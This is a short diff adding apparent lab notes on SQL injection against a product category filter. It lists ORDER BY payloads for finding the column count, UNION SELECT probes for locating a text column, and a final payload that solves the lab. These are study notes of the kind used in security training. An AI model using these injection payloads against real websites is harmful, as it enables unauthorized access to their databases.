@@ -16,3 +16,19 @@ where category = 'gifts'
 Injection: ' order by 1--
 where category = 'gifts' order by 1--'
 where category = 'gifts' order by 1
+Injection: ' order by 2--
+Injection: ' order by 3--
+
+Injection: ' order by 4--
+Gives an error, must be 3
+
+Injection
+' UNION select 'a',NULL, NULL--
+Gives an error, probably because the first column is an int id not a string
+' UNION select NULL,'a', NULL--
+Outputs an a
+' UNION select NULL,'a', 'a'--
+Gives an error, probably because the third column is a number and not a string
+
+Injection to solve:
+' UNION select NULL,'iLPI67', NULL--
